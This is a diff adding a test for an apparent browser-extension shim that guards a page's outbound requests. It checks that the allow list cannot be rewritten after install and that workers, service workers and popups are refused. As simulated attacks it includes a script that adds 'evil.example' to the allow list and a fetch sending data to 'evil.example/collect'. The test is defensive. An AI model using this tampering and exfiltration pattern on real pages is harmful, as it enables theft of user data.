@@ -125,3 +125,32 @@ test("the page shim is a second layer of containment: under an allow list a scri
   assert.equal(blocked.length, 1);
   assert.match(blocked[0].why, /evil\.example/);
 });
+
+test("the shim's allow list cannot be tampered with after install, and under the eval guard workers and popups are refused", async () => {
+  const vm = await import("node:vm");
+  const { guardInstallWrites, guardCollect } = await import("./extension/shared/outbound.js");
+  const win = /** @type {any} */ ({
+    location: { origin: "https://app.example", href: "https://app.example/w", host: "app.example" },
+    fetch: async () => ({ ok: true }), XMLHttpRequest: class { open() {} send() {} }, navigator: { sendBeacon: () => true, serviceWorker: { register: async () => ({}) } },
+    HTMLFormElement: class { submit() {} requestSubmit() {} }, Node: class {}, Element: class {}, document: { addEventListener() {}, removeEventListener() {} },
+    Worker: class {}, SharedWorker: class {}, open: () => ({}), __vyreAllow: ["https://api.example"], URL, Promise, TypeError, Error, Array, String, Object,
+  });
+  win.window = win;
+  vm.createContext(win);
+  vm.runInContext(guardInstallWrites, win);
+  assert.equal(win.__vyreAllow, undefined, "the list is not left on the page");
+  win.__vyreAllow = ["https://evil.example"]; // a script trying to add its own origin after install
+  await assert.rejects(win.fetch("https://evil.example/collect"), /held/, "a list the script writes later counts for nothing");
+  assert.throws(() => new win.Worker("blob:x"), /held/);
+  assert.throws(() => new win.SharedWorker("x"), /held/);
+  await assert.rejects(Promise.resolve().then(() => win.navigator.serviceWorker.register("/sw.js")), /held/);
+  assert.throws(() => win.open("https://evil.example"), /held/);
+  const blocked = vm.runInContext(guardCollect, win);
+  assert.ok(blocked.length >= 5);
+  // without an allow list (a click, not an eval) nothing of this is touched
+  const plain = /** @type {any} */ ({ location: { origin: "https://app.example", href: "https://app.example/w", host: "app.example" }, fetch: async () => ({}), XMLHttpRequest: class { open() {} send() {} }, navigator: {}, HTMLFormElement: class { submit() {} requestSubmit() {} }, Node: class {}, Element: class {}, document: { addEventListener() {}, removeEventListener() {} }, Worker: class {}, open: () => "opened", URL, Promise, TypeError, Error, Array, String, Object });
+  plain.window = plain; vm.createContext(plain);
+  vm.runInContext("window.__vyreWrites = true;" + (await import("./extension/shared/outbound.js")).guardInstall, plain);
+  assert.equal(plain.open(), "opened");
+  assert.doesNotThrow(() => new plain.Worker("x"));
+});
